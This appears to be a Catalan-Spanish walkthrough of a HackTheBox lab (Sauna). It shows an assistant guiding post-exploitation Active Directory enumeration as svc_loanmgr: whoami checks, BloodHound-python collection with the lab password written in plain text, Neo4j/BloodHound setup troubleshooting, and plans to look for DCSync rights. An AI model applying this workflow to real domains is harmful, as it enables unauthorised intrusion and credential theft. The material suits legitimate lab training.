La senyal prèvia és clara: ja existeix una nueva sesión válida i ara interessa medir su valor real.

Què hacen:

* `whoami` confirma de forma explícital context exacto del usuari actual.
* `whoami /groups` mostra les pertenencias efectivas del usuari, que poden orientar la següent fase.
* `whoami /priv` ayuda a ver si existeix algún privilegi local interesante, tot i que la expectativa principal aquí està més en AD que en privilegis locals clásicos.

Què se espera obtenir:

* confirmación neta de que la sesión és realment `svc_loanmgr`
* grups efectivos del usuari
* posibles privilegis destacados o, al menys, la ausencia de ellos

Quina part de la sortida interessa realment:

* pertenencias no triviales
* diferencias clares respecto a `fsmith`
* cualquier pista que justifique passar a enumeració de permisos delegats en domini

Com canvia la decisió següent:

* si apareixen grups o privilegis clarament útils, se orientará la següent fase hacia ellos
* si no apareixen senyals locals fortes, entonces la següent decisió lógica será una enumeració de drets de domini des de fuera o amb eines específicas de AD

## checks

Confirmar que `whoami` retorna exactamente la compte esperada.

Comparar mentalmente `whoami /groups` amb el que visto abans en `fsmith` per detectar si realment ha aumentado el valor del context.

No sacar conclusiones massa pronto si `whoami /priv` parece normal; en comptes de servei de AD, el valor pot estar en permisos delegats de domini que no se ven aquí de forma directa.

## writeup_notes

La credencial extraída del registre no nomes va permetre identificar una segunda compte, sinó cambiar amb éxito a un context de usuari més interesante dentro del entorn. En aquest momento, la investigación dejó de centrarse en accés inicial i va passar a enfocarse en què drets reals tenia aquesta compte dentro del domini.

Lliçó reutilitzable: en Windows/AD, el valor de una compte no siempre se aprecia per sus privilegis locals inmediatos. A veces el verdadero salto apareix quan una compte aparentment modesta té permisos delegats en el domini que només se revelan en una fase posterior de enumeració.

## Executem el bloc i revisem la sortida

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami / groups
whoami.exe : ERROR: Invalid argument/option - '/'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid argument/option - '/'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Type "WHOAMI /?" for usage.
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami / priv
whoami.exe : ERROR: Invalid argument/option - '/'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid argument/option - '/'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Type "WHOAMI /?" for usage.

objective

Corregir el error sintáctico en la comprobación del context de `svc_loanmgr`, confirmar grups i privilegis efectivos de la nueva sesión i decidir si el valor de aquesta compte està en privilegis locals o en permisos delegats de domini.

verified_facts

La nueva sesión remota està abierta correctament com:

* `egotisticalbank\svc_loanmgr`

La compte `svc_loanmgr` ja no és una hipótesis ni una referencia del registre: és un context remot válido i operatiu.

Els intentos amb `whoami / groups` i `whoami / priv` no fallaron per falta de permisos, sinó per sintaxis incorrecta. El error el que deixa clar: `Invalid argument/option - '/'`.

Això significa que encara no se ha obtenido la informació de grups ni de privilegis; aquesta part sigue pendent.

assumptions

La inferència principal és que el següent dato clave està en els grups i privilegis efectivos de `svc_loanmgr`.

També és raonable asumir que, si no apareixen privilegis locals especialment útils, el valor real de aquesta compte probablemente estará en permisos o delegaciones dentro del domini i no en el host local.

method

Primer se corrige el ordre sense cambiar de eina ni de branca.

Després se revisa la sortida buscando senyals de valor real: grups amb capacidad operativa, privilegis locals rellevants o ausencia de ambos.

No se abren encara branques paralelas perquè abans convé tancar aquesta comprobación básica del nuevo context.

answer

Aquí no ha fallado la enumeració; ha fallado la sintaxis.

En `whoami`, les opciones van sense espacio entre la barra i el argumento. Al escribir `whoami / groups` i `whoami / priv`, PowerShell terminó lanzando `whoami.exe` amb argumentos inválidos. És un error petit, però important de corregir perquè encara no se ha visto la part que realment interessa del nuevo context.

El troballa dominant sigue siendo que `svc_loanmgr` ja és una segunda sesión válida i que ara toca medir su valor real.

Quina troballa domina ara: existeix una sesión remota válida com `svc_loanmgr`.

Quina branca principal continua activa: enumeració de privilegis i context efectivo de `svc_loanmgr`.

Quines branques secundàries queden anotades: anàlisi local adicional del host i, si no apareixen senyals locals, futura enumeració de permisos de domini.

Quin és el següent pas únic: repetir correctament la comprobación de grups i privilegis de `svc_loanmgr`.

commands

```powershell id="g8t2vy"
whoami
whoami /groups
whoami /priv
```

Per què és proposen aquestes ordres:

`whoami` se repite per dejar trazabilidad neta del context abans de seguir.

`whoami /groups` se usa perquè la senyal prèvia és que aquesta compte probablemente vale més per sus pertenencias que per su mera existencia. El que que interessa és ver si apareix algún grup no trivial o diferente del que visto amb `fsmith`.

`whoami /priv` sirve per comprovar si el usuari té privilegis locals destacados. No se espera necesariamente una joya aquí, però convé verificarlo abans de concluir que el valor està només en AD.

Què se espera obtenir:

* confirmación neta del usuari actual
* llista de grups efectivos
* llista de privilegis del token

Quina part de la sortida interessa realment:

* grups fuera del que común
* diferencias respecto a `fsmith`
* privilegis habilitados o potencialmente útils
* en su ausencia, una senyal clara de que la següent fase ha de mirar al domini i no al host

Com canvia la decisió següent:

* si apareixen grups o privilegis fortes, la següent fase se centrará en ellos
* si no apareix nada especial, el següent pas lógico será passar a enumeració de permisos delegats en domini

checks

Comprovar que `whoami` sigue devolviendo `egotisticalbank\svc_loanmgr`.

Revisar `whoami /groups` buscando pertenencias distintas a les de un usuari remot estándar.

Revisar `whoami /priv` per distingir entre privilegis presentes però deshabilitados i ausencia total de valor local.

No interpretar aún la compte com “sense valor” si la sortida parece normal; en aquest tipo de cas, el verdadero pes pot estar en AD.

writeup_notes

El primer intento de revisar grups i privilegis de `svc_loanmgr` falló per una cuestión de sintaxis, no per restricciones del sistema. Corregido aquest detalle, la comprobación correcta permet decidir si el valor de la compte està en privilegis locals del host o en permisos delegats dentro del domini.

Lliçó reutilitzable: en una fase de post-explotació, un error petit de sintaxis pot parecer un bloqueo tècnic quan en realidad només impide llegir la evidència. Abans de reinterpretar el cas, convé confirmar que el ordre se ha ejecutado exactamente com se pretendía.

# Executem el bloc i revisem la sortida

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

objective

Interpretar el context real de `svc_loanmgr`, distingir entre privilegis locals i valor en domini, i fijar un següent pas únic que permita descubrir si aquesta compte té permisos delegats útils en Active Directory.

verified_facts

La sesión actual està abierta correctament com:

`egotisticalbank\svc_loanmgr`

Els grups efectivos observats son, en esencia, els mismos que ja se habían visto amb `fsmith`:

* `Remote Management Users`
* `Users`
* `Pre-Windows 2000 Compatible Access`
* grups estándar de autenticación

No apareixen grups locals administrativos ni pertenencias que, per sí solas, expliquen una escalada local inmediata.

Els privilegis observats tampoco apuntan a una via local dominant. El que rellevant és:

* `SeMachineAccountPrivilege` habilitado
* `SeChangeNotifyPrivilege` habilitado
* `SeIncreaseWorkingSetPrivilege` habilitado

No apareixen privilegis clásicos de alt impacto local com `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege` o similares.

Amb la evidència actual, el cambio de `fsmith` a `svc_loanmgr` no ha revelado una ventaja local clara en el host, però sí confirma que se ha pasado a una segunda compte operativa válida del domini.

assumptions

La inferència principal és que el valor real de `svc_loanmgr` probablemente no està en sus grups locals ni en su token de privilegis, sinó en permisos delegats dentro del domini.

`SeMachineAccountPrivilege` és una senyal interesante, però per sí sola no dominal cas en aquest momento. No convé convertirla encara en la branca principal sense una justificación millor.

La hipótesis de trabajo més raonable és que la següent pista útil està en ACLs, drets delegats o relacions de control en Active Directory que no se ven amb `whoami /groups` ni amb `whoami /priv`.

method

Primer se cierra la comprobación del token local: ja se ha visto que no hi ha una via local obvia de privilegis altos.

Després se evita perder temps en enumeració local repetitiva o en probar branques secundàries sense senyal forta.

El següent pas únic correcte és una enumeració de permisos de domini des de fuera, usant la credencial ja validada de `svc_loanmgr`, per descubrir si aquesta compte té drets delegats sobre otros objectes del domini.

answer

La lectura de aquesta sortida és bastante clara.

`svc_loanmgr` té mes valor que `fsmith`, però aquest valor no se està manifestando en el host local de forma evident. Sus grups son básicos i sus privilegis locals no apuntan a una escalada inmediata. Això no significa que la compte sea “normal”; significa alguna cosa més interesante: su posible pes està en Active Directory, no en el equip local.

Aquest matiz cambia la decisió següent. Ja no merece la pena insistir en buscar una privesc local clàssica amb aquesta evidència. El que correcte ara és passar a una enumeració de permisos de domini.

La branca principal activa ha de quedar así: **enumeració AD orientada a drets delegats de `svc_loanmgr`**.

Quina troballa domina ara: `svc_loanmgr` és una compte vàlid i su token local parece normal, el que que desplazal interés hacia permisos de domini.

Quina branca principal continua activa: enumeració de Active Directory centrada en ACLs, delegaciones i relacions de control.

Quines branques secundàries queden anotades: `SeMachineAccountPrivilege` com posibilidad lateral, i revisión local adicional del host només si la enumeració AD no retorna una via més forta.

Quin és el següent pas únic: recolectar datos de BloodHound amb `svc_loanmgr` i revisar què drets efectivos té dentro del domini.

commands

```bash id="1w7kdp"
BloodHound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
```

Aquest ordre se propone perquè la senyal prèvia lleva justo ahí: el token local no explica una escalada, así que hi ha que mirar permisos de domini.

Què fa:
recoge informació del domini amb la compte actual i genera els JSON necesarios per analitzar relacions entre usuaris, grups, ACLs i drets delegats.

Què se espera obtenir:
un conjunto de fitxers JSON que després permitan revisar si `svc_loanmgr` controla algún objecte, té drets de replicación, delegaciones peligrosas u otra relació útil en AD.

Quina part de la sortida interessa realment:
que la recol·lecció termine correctament i genere els fitxers de sortida sense errores de autenticación, DNS o resolució de domini.

Com canvia la decisió següent:
si la recol·lecció sale bien, el següent anàlisi ja no será “probar cosas a ciegas”, sinó revisar de forma dirigida què permisos concrets té `svc_loanmgr` en el graf del domini.

checks

Comprovar que `bloodhound-python` termina sense errores i genera diversos `.json`.

Si apareix un problema de resolució, revisar que el nom de domini i el DNS usado sean correctos, però sense cambiar encara de branca.

Quan estén els JSON, el punt clave a revisar no será una vista genérica del domini, sinó consultas orientadas a drets delegats del usuari actual, especialment relacions de control sobre el domini u objectes sensibles.

writeup_notes

El cambio a `svc_loanmgr` no reveló privilegis locals especialment potentes, i precisamente aquest detalle va ser el que orientó correctament la següent fase. En lugar de insistir en una privesc local sense senyal forta, la investigación va passar a centrarse en permisos delegats de domini, que son els que a menudo explican el valor real de una compte de servei en un entorn Active Directory.

Lliçó reutilitzable: quan una compte nueva no mostra grups privilegiados ni privilegis locals llamativos, no convé asumir que té poc valor. En Active Directory, muchas comptes aparentment discretas esconden su importancia en ACLs i drets delegats que només apareixen al enumerar el domini.

# Executem el bloc i revisem la sortida

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content
BloodHound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
zip bloodhound_sauna.zip *.json
ls -l *.json bloodhound_sauna.zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7cc2:310a:b259:9b93
INFO: Trying LDAP connection to dead:beef::7cc2:310a:b259:9b93
INFO: Testing resolved hostname connectivity dead:beef::165
INFO: Trying LDAP connection to dead:beef::165
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7cc2:310a:b259:9b93
INFO: Trying LDAP connection to dead:beef::7cc2:310a:b259:9b93
INFO: Testing resolved hostname connectivity dead:beef::165
INFO: Trying LDAP connection to dead:beef::165
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 09S
  adding: 20260423232923_computers.json (deflated 76%)
  adding: 20260423232923_containers.json (deflated 93%)
  adding: 20260423232923_domains.json (deflated 79%)
  adding: 20260423232923_gpos.json (deflated 89%)
  adding: 20260423232923_groups.json (deflated 94%)
  adding: 20260423232923_ous.json (deflated 69%)
  adding: 20260423232923_users.json (deflated 92%)
.rw-r--r-- r4mon r4mon 4.1 KB Thu Apr 23 23:29:33 2026  20260423232923_computers.json
.rw-r--r-- r4mon r4mon  25 KB Thu Apr 23 23:29:28 2026  20260423232923_containers.json
.rw-r--r-- r4mon r4mon 3.5 KB Thu Apr 23 23:29:29 2026  20260423232923_domains.json
.rw-r--r-- r4mon r4mon 6.0 KB Thu Apr 23 23:29:27 2026  20260423232923_gpos.json
.rw-r--r-- r4mon r4mon  82 KB Thu Apr 23 23:29:27 2026  20260423232923_groups.json
.rw-r--r-- r4mon r4mon 1.9 KB Thu Apr 23 23:29:27 2026  20260423232923_ous.json
.rw-r--r-- r4mon r4mon  16 KB Thu Apr 23 23:29:26 2026  20260423232923_users.json
.rw-r--r-- r4mon r4mon  12 KB Thu Apr 23 23:29:33 2026  bloodhound_sauna.zip

## objective

Tancar correctament la fase de Recol·lecció d'Active Directory, interpretar què significa la sortida obtenida i fijar un següent pas únic per descubrir si `svc_loanmgr` té drets delegats de alt valor en el domini.

## Fets verificats

La recol·lecció amb `bloodhound-python` ha funcionado correctament i ha generado els artefactos esperados.

Se han creado diversos fitxers JSON i a més un paquete listo per importar:

* `bloodhound_sauna.zip`

La autenticación amb `svc_loanmgr` ha sido suficient per enumerar el domini, tot i que la obtenció inicial de TGT per Kerberos falló i la eina va fer **fallback a NTLM**. Això no invalida la recol·lecció perquè, de fet, el proceso continuó i terminó amb éxito.

La sortida confirma un context AD petit i manejable:

* 1 domini
* 1 equip
* 7 usuaris
* 52 grups
* 3 GPOs
* 1 OU
* 19 containers
* 0 trusts

La enumeració ja no és una hipótesis: existeix material suficient per analitzar relacions de control i drets delegats en BloodHound.

## assumptions

La inferència principal és que el valor de `svc_loanmgr` sigue estando en permisos de domini i no en privilegis locals del host.

També és raonable asumir que el fallo de Kerberos al pedir TGT no és aral problema important, perquè la recol·lecció ja salió adelante per NTLM i ha producido els datos necesarios per analitzar el graf.

La hipótesis de trabajo més forta és que el següent hallazgo rellevant aparecerá al revisar si `svc_loanmgr` té relacions de control sobre el domini o sobre objectes sensibles, especialment drets de replicación o privilegis equivalentes.

## method

Primer se cierra la fase de recol·lecció perquè ja ha cumplido su objective: obtenir datos de AD amb la compte actual.

Després se evita volver a enumeració local o a branques secundàries. El que correcte ara és passar de la recopilación al anàlisi dirigido del graf.

El següent pas únic no és “mirar BloodHound sense rumbo”, sinó obrir el graf i comprovar de forma específica què drets té `svc_loanmgr`, empezando per consultas orientadas a relacions peligrosas sobre el domini.

## answer

Aquest pas ha salido bien i deixa la màquina en un punt molt bo.

El que important no és només que `bloodhound-python` haya generado fitxers, sinó que ja existeix una base real per responder la pregunta clave del cas: **què pot fer `svc_loanmgr` en Active Directory**.

El detalle del fallback a NTLM hi ha que leerlo correctament. No és una derrota de Kerberos ni una senyal de via muerta. És només un tropiezo de resolució/nom per el TGT inicial. Com la recol·lecció se completó i els JSON salieron bien, no merece la pena distraerse ara amb això. La decisió correcta és seguir adelante amb el anàlisi.

La branca principal activa queda así: **anàlisi de BloodHound orientat a drets delegats de `svc_loanmgr`**.

El següent pas únic més net és **importar `bloodhound_sauna.zip` i revisar consultas dirigidas a privilegis de replicación i relacions de control**, empezando per el usuari actual.

**Quina troballa domina ara:** ja existeix una recol·lecció válida de Active Directory hecha amb `svc_loanmgr`.

**Quina branca principal continua activa:** anàlisi de permisos delegats i relacions de control en el domini.

**Quines branques secundàries queden anotades:** Correcció futura de resolució Kerberos si hiciera falta, i la posibilidad lateral de `SeMachineAccountPrivilege`, però ambas queden en segundo pla.

**Quin és el següent pas únic:** importar `bloodhound_sauna.zip` en BloodHound i revisar els drets efectivos de `svc_loanmgr` sobre el domini.

## commands

En la màquina atacant:

```bash id="c1v7mz"
neo4j console
```

En otra terminal local:

```bash id="u8q2fk"
BloodHound
```

Després, dentro de la interfaz:

1. iniciar sesión en BloodHound
2. importar `bloodhound_sauna.zip`
3. buscar el nodo `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`
4. revisar consultas orientadas a privilegis altos, en especial:

   * **Find Principals with DCSync Rights**
   * relacions directas des de `SVC_LOANMGR`
   * edges sobre el domini `EGOTISTICAL-BANK.LOCAL`

Per què se propone esto:

La senyal prèvia ja apunta amb fuerza a permisos de domini. No té sentido seguir enumerando localment si ja se dispone del graf.

Què se espera obtenir:

* una relació clara entre `svc_loanmgr` i algún derecho rellevant en AD
* o, si no apareix nada forta, una base objetiva per reevaluar la següent branca

Quina part de la sortida interessa realment:

* si `SVC_LOANMGR` apareix conectado al domini amb edges de alt valor
* especialment relacions com `GetChanges`, `GetChangesAll` o equivalentes
* cualquier control sobre objectes sensibles del domini

Com canvia la decisió següent:

* si apareix un derecho forta sobre el domini, la següent fase quedará totalmente enfocada en aquest abús concret
* si no apareix nada rellevant, entonces sí tocará reevaluar amb otras rutas de AD o del host

## checks

Comprovar que BloodHound carga correctament el ZIP i mostral domini `EGOTISTICAL-BANK.LOCAL`.

Buscar primer al usuari `SVC_LOANMGR` i no empezar per vistas genéricas del domini.

Si apareix una arista de alt valor sobre el domini, fijarse en el **nom exacto del edge** i sobre què objecte cae.

No perder temps ara afinando el problema de Kerberos/TGT, perquè la recol·lecció útil ja està hecha.

## writeup_notes

La recol·lecció de BloodHound marcó el pas de la enumeració del host al anàlisi estructurado del domini. Tot i que la obtenció inicial del TGT per Kerberos falló per un problema de resolució, la eina completó la recol·lecció mediante NTLM i va generar un conjunto de datos suficient per estudiar relacions de control i drets delegats.

Lliçó reutilitzable: en Active Directory, un petit fallo tècnic durant la autenticación inicial no siempre invalida la fase. Si la recol·lecció termina i produce datos útils, el que correcte és interpretar el resultat global i avanzar al anàlisi del graf, en lugar de detenerse en un detalle que ja no bloquea la investigación.

# Executem el bloc i revisem la sortida

❯ sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2026-04-23 21:35:59.752+0000 INFO  Starting...
2026-04-23 21:36:00.182+0000 INFO  This instance is ServerId{775cd324} (775cd324-74c4-412b-9e46-9c187f67764a)
2026-04-23 21:36:01.185+0000 INFO  ======== Neo4j 4.4.16 ========
2026-04-23 21:36:02.544+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2026-04-23 21:36:02.552+0000 INFO  Setting up initial user from defaults: neo4j
2026-04-23 21:36:02.553+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2026-04-23 21:36:02.575+0000 INFO  Setting version for 'security-users' to 3
2026-04-23 21:36:02.578+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2026-04-23 21:36:02.583+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2026-04-23 21:36:02.887+0000 INFO  Bolt enabled on localhost:7687.
2026-04-23 21:36:03.558+0000 INFO  Remote interface available at http://localhost:7474/
2026-04-23 21:36:03.561+0000 INFO  id: D443307DA8287679E268157C4724A1C9DCCD79627BEC12417B229A3EF69CDA9E
2026-04-23 21:36:03.561+0000 INFO  name: system
2026-04-23 21:36:03.562+0000 INFO  creationDate: 2026-04-23T21:36:01.691Z
2026-04-23 21:36:03.562+0000 INFO  Started.

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/
❯ bloodhound
[sudo] contrasenya per r4mon:

 It seems it's the first time you run BloodHound

 Please run BloodHound-setup first

Do you want to run BloodHound-setup now? [I/n] i

 [*] Starting PostgreSQL service

 [*] Creating Database

 Creating database user

 Creating database
ALTER ROLE

 [*] Starting neo4j
Neo4j is running at pid 192150

 [i] You need to change the default password for neo4j
     Default credentials are user:neo4j password:neo4j

 [!] IMPORTANT: Once you have setup the new password, please update /etc/bhapi/bhapi.json with the new password before running bloodhound

 opening http://localhost:7474/
Running Firefox as root in a regular user's session is not supported.  ($XAUTHORITY is /home/r4mon/.Xauthority which is owned by r4mon.)

objective

Desbloquear el anàlisi local de BloodHound sense tocar més el objective i dejar llista la importación del graf ja recolectado.

verified_facts

Neo4j ja està arrancado correctament en la màquina atacant i escucha en:

* `http://localhost:7474/`
* `bolt://localhost:7687`

Neo4j ha creado el usuari inicial `neo4j` i exige cambio de contrasenya en el primer accés.

La recol·lecció del domini ja està hecha i existeix un ZIP válido:

* `bloodhound_sauna.zip`

El bloqueo actual no està en el objective ni en les credencials. Està en el entorn atacant.

El intento de obrir BloodHound lanzó el navegador com root i per això Firefox el que rechazó. Aquest error no cuestiona ni el graf ni la compte `svc_loanmgr`; només indica que la part local se està intentando obrir amb el usuari equivocado.

assumptions

La inferència principal és que el següent avance depèn de terminar la inicialización local de Neo4j i lanzar la interfaz com usuari normal, no com root.

També hi ha una posibilidad raonable de que el paquete `bloodhound` instalado en la màquina atacant no sea exactamente el cliente legacy clàssic, sinó una variante més nueva amb su pròpia inicialización. Convé tenerlo presente, però no fa falta cambiar de branca encara.

method

Primer se resuelve el requisito mínimo de Neo4j: cambiar la contrasenya inicial des de un navegador abierto com usuari normal.

Després se actualiza la configuración local que el propi asistente de BloodHound ha pedido.

Només entonces se vuelve a lanzar BloodHound com usuari normal, sense `sudo`.

answer

Ara mateix no hi ha que volver al host Windows. El següent pas correcte està completamente en la màquina atacant.

La lectura bona del que que ha pasado és aquesta: Neo4j ja està bien, el graf ja està recogido, i el únic atasco real és que la primera ejecución de BloodHound quiso obrir el navegador com root. Això és un problema de escritorio local, no del laboratorio.

Así que el següent pas únic correcte és **obrir Neo4j en el navegador com `r4mon`, cambiar la contrasenya per defecto i després volver a lanzar BloodHound sense `sudo`**.

Quina troballa domina ara: el domini ja està recolectado i el únic bloqueo és la preparación local del visor del graf.

Quina branca principal continua activa: anàlisi de permisos delegats de Active Directory a partir del ZIP ja generado.

Quines branques secundàries queden anotades: posible desajuste entre cliente legacy i stack més nuevo de BloodHound, però encara com observació secundària.

Quin és el següent pas únic: cambiar la contrasenya inicial de Neo4j en el navegador com usuari normal i relanzar BloodHound sense `sudo`.

commands

En una terminal local nueva, com `r4mon`, sense `sudo`:

```bash id="n6k3pw"
xdg-open http://localhost:7474
```

Si `xdg-open` no abre nada, hacerlo manualmente des del navegador del usuari normal i entrar en:

`http://localhost:7474`

Dentro del navegador:

* usuari: `neo4j`
* contrasenya actual: `neo4j`
* cambiarla per una nueva contrasenya que quede anotada

Després, actualizar el fitxer que te ha indicado el propi setup:

```bash id="m8r2qy"
sudo nano /etc/bhapi/bhapi.json
```

Ahí hi ha que sustituir la contrasenya antigua de Neo4j per la nueva que acabas de poner.

Després, ja com usuari normal, sense `sudo`:

```bash id="t4v7lx"
BloodHound
```

Per què se propone esto:

La senyal prèvia és clarísima: Neo4j ja arrancó bien, BloodHound ja dijo què requisito faltaba i el error de Firefox va ser només per abrirlo com root.

Què se espera obtenir:

* accés correcte a Neo4j amb contrasenya nueva
* configuración local actualizada
* lanzamiento de BloodHound sense el error del navegador com root

Quina part de la sortida interessa realment:

* que el cambio de contrasenya en Neo4j se complete
* que `bloodhound` ja no se queje del setup inicial
* que la interfaz quede operativa per importar `bloodhound_sauna.zip`

Com canvia la decisió següent:

* si la interfaz abre bien, el següent pas será importar el ZIP i revisar específicamente què drets té `SVC_LOANMGR`
* si vuelve a aparecer un flujo raro de CE/web stack, entonces ja habrá que decidir si seguir amb aquesta variante o usar un cliente legacy més compatible amb els JSON actuals

checks

No tancar la terminal on Neo4j està corriendo.

No volver a lanzar `bloodhound` amb `sudo`.

Confirmar que la contrasenya nueva de Neo4j queda també reflejada en `/etc/bhapi/bhapi.json`.

Si BloodHound abre bien, comprovar abans de nada que permita cargar el ZIP ja generado.

writeup_notes

La enumeració del domini ja estaba completada; el únic bloqueo posterior va ser local, en la màquina atacant, al iniciar la capa de visualización del graf. Neo4j arrancó correctament, però la primera ejecución de BloodHound va intentar obrir el navegador com root, el que que impidió completar la inicialización des del escritorio del usuari.

Lliçó reutilitzable: en fases de anàlisi AD amb BloodHound, convé separar molt bien tres plans distintos: recol·lecció del domini, base de datos del graf i cliente visual. A veces el domini ja està bien enumerado i el únic problema real està en com se inicializa o se abre la interfaz local.

# Executem el bloc i revisem la sortida

Image_1

❯ sudo nano /etc/bhapi/bhapi.json
Sustiutimos la password antigua per la nueva que hemos puesto en Neo4j i guardamos el fitxer.

Entramos en el navegador amb la nueva contrasenya i confirmamos que el accés a Neo4j és correcte. Image-2

Ara sí, lanzamos BloodHound sense `sudo`:

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/
❯ bloodhound
[sudo] contrasenya per r4mon:

 Starting neo4j
Neo4j is running at pid 192150

 BloodHound will start

 IMPORTANT: It will take time, please wait...

{"time":"2026-04-24T00:09:52.226785257+02:00","level":"INFO","message":"Reading configuration found at","path":"/etc/bhapi/bhapi.json"}
{"time":"2026-04-24T00:09:52.226977457+02:00","level":"ERROR","message":"Unable to read configuration","config_file_path":"/etc/bhapi/bhapi.json","err":"invalid character 'i' looking for beginning of value"}

El error de JSON indica que el formato del fitxer `/etc/bhapi/bhapi.json` no és correcte. És probable que haya un error de sintaxis, com una coma de més, una comilla mal tancada o un carácter extraño.

Corregido el error de formato en el JSON, volvemos a lanzar BloodHound sense `sudo`:

Ara se executa però nos da diversos errores de SQLSTATE 42601, el que que suggereix que el cliente de BloodHound que estamos usant no és compatible amb la versión de Neo4j o amb el formato de els JSON generados.

## objective

Desbloquear el anàlisi del graf sense perder més temps en la instalación local i elegir la via més práctica per seguir amb Sauna.

## Fets verificats

La recol·lecció de datos del domini ja salió bien i va generar els JSON i el ZIP. El bloqueo actual està només en la capa local de BloodHound. La traza que has pegado mostra que la aplicación falla durant una migración SQL `v8.5.0` amb `ERROR: syntax error at or near "STORAGE"`, así que ara mateix el problema no està en `svc_loanmgr`, ni en el DC, ni en la credencial, sinó en el stack local que intenta arrancar BloodHound. A més, la documentación actual de PostgreSQL define `SET STORAGE` com sintaxis de `ALTER TABLE`, no com part de una definición de columna dentro de `CREATE TABLE`, el que que encaja amb el tipo de error que estás viendo. ([PostgreSQL][1])

També hi ha una senyal important de mezcla de generaciones de eina: `bloodhound-python` se presenta explícitamente com **“for BloodHound LEGACY (BloodHound 4.2 and 4.3)”**, mientras que la documentación actual de SpecterOps per BloodHound CE indica que **SharpHound CE és el recolector oficial** per CE, i que BloodHound CE usa una arquitectura moderna distinta, amb PostgreSQL per la base de aplicación i Neo4j per el graf. ([BloodHound.specterops.io][2])

## assumptions

La inferència raonable és que ara mateix estás peleándote amb una combinación poc agradecida: datos recogidos amb una eina orientada a **Legacy**, però intentando analizarlos en una instalación **CE** que a més està atascada en sus migraciones locals. Aquesta inferència no sale de intuición pura, sinó de juntar les dos senyals anteriores. ([BloodHound.specterops.io][2])

## method

En lugar de seguir depurando BloodHound CE a aquestes horas, la via més neta per aquest lab és cambiar a una de aquestes dos opciones:

1. usar **BloodHound Legacy 4.3.1**, que encaja millor amb la sortida de `bloodhound-python`;
2. o prescindir del visor per ara i seguir el cas amb la pista dominant ja conocida: `svc_loanmgr` probablemente té drets delegats de domini i la comprobación clave será DCSync.

## answer

La conclusión práctica és aquesta: **yo dejaría de pelearme ara amb BloodHound CE**.

No perquè tu recogida esté mal, sinó perquè el atasco actual és local, ajeno al objective, i huele a mezcla de stack nuevo amb flujo viejo. Tu evidència útil ja la tienes. El que més rentable per seguir amb Sauna és:

* **Plan A**: obrir els JSON en **BloodHound Legacy 4.3.1**, que és el que més coherente amb `bloodhound-python`.
* **Plan B**: si no quieres seguir tocando BloodHound ara, continuar directament amb una Verificació de permisos de domini des de la compte `svc_loanmgr`.

